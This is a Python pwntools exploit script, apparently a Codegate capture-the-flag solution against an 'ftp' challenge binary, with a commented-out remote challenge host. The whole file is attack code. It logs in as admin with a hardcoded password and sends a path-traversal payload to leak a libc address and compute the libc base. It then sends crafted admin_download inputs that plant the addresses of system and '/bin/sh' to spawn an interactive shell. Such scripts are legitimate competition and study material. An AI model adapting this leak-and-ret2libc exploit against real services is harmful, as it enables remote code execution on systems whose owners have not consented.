from pwn import *

elf=ELF("./ftp")
libc=ELF("./libc.so.6")

p=process("./ftp", env={"LD_PRELOAD":"./libc.so.6"})
#p=remote("ch41l3ng3s.codegate.kr", 2121)
#p=remote("localhost", 12345)

def join(name, age, Id, Pw):
    p.send(p32(0x1))
    time.sleep(0.1)
    print p.recv()
    p.sendline(name)
    print p.recv()
    p.sendline(str(age))
    print p.recv()
    p.sendline(Id)
    print p.recv()
    p.sendline(Pw)
    print p.recv()

def login(Id, Pw):
    p.send(p32(0x3))
    time.sleep(0.1)
    print p.recv()
    p.sendline(Id)
    print p.recv()
    p.sendline(Pw)
    time.sleep(0.1)
    print p.recv()

def download(data):
    p.send(p32(0x5))
    time.sleep(0.1)
    print p.recv()
    p.sendline(data)
    time.sleep(0.1)

def admin_download(data):
    p.send(p32(0x8))
    time.sleep(0.1)
    p.send(p32(0x1))
    time.sleep(0.1)
    p.sendline(data)
    time.sleep(0.1)


join("A",12,"A","A")

login("admin","P3ssw0rd")

payload="/AAAAAAAAAAAAAAAAAAAAAAAAAA/../../BBBBBBBBBBBBBBBBBBBBBB"
print 'len -> ', hex(len(payload))
download(payload)
print p.recvuntil("../")
print p.recv(19)
libc_base =  u32(p.recv(4)[::-1]) - 0x1b070a
libc.address = libc_base
print hex(libc_base)

for i in range(0x2e):
    login("admin","P3ssw0rd")


system = libc.symbols['system']
binsh = next(libc.search("/bin/sh\x00"))
print 'binsh -> ', hex(binsh)
print 'system -> ', hex(system)
#gdb_pie_attach(p,[0x28e2], "tracemalloc on\n")

admin_download("/../AAAABBBB"+p32(binsh)[::-1]+"CCCC"+p32(system)[::-1])
admin_download("/../../AABBB"+p32(binsh)[::-1]+"CCCC"+p32(system)[::-1])

p.interactive()
